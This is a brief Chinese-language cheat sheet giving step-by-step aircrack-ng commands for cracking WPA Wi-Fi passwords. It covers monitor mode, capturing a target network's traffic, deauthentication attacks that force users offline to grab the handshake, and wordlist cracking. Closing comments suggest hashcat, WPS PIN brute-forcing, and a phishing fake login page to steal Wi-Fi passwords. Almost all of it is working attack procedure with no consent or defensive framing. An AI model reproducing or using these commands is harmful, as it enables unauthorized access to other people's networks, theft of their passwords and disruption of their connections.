1.iwconfig                                                  --查看无线网卡
2.airmon-ng start wlan0                                     --start(开始) wlan0(网卡) 激活网卡监听模式
3.iwconfig                                                  --查看无线网卡 查看无线网卡是不是开启了无线监听功能 ，出现wlanmon说明监听模式已经开启
4.airodump-ng wlan0mon                                      --.airodump-ng(捕获数据) wlan0mon（监听模式网卡）捕获监听网卡的数据 
5.airodump-ng -c 1 -w /root/cap/er8 --bssid (mac) wlan0mon  --解释airodump-ng -c（wifi信道CH） 1(信道) -w /root/cap/er8（数据包储存道这个位置） --bssid (mac) wlan0mon（指定网卡）
6.--新建一个终端
7.aireplay-ng -0 5 -a (mac) wlan0mon                        --aireplay-ng(注入数据包含命令） -0 （取消认证数据包）5（攻击5次） -a (mac) wlan0mon   --右上角出现WAPhandshake说明数据抓取成功
8.airmon-ng stop wlan0mon                                   --关闭监听
破解数据包
aircrack-ng -w /root/123.txt /root/cap/er0-01.cap           --出现 KEY 说明成功
#以上这种破解主要是利用数据的三次握手，攻击用户迫使用户下线重新连接，捕获用户重新连接的数据进行数据包分析从中获取密码，wifi6的数据包破解不了，如果用户密码设置过长也破解不了，那样就成为了金刚包and密码过长字典的数据也比较大从而也破解不了，使用air命令破解的也比较慢 可以用Hshcat可以大大提高破解速度
#还有就是使用水滴liunx，进行pin码6位数的破解，这个首先需要用户提前开启pin码，破解完成后即使用户更改密码也是无效的
#还有就是使用钓鱼的方式进行诱骗，首先制作一个假的wifi认证界面，让用户连接到这个假的wifi上，让用户输入密码从而获取密码
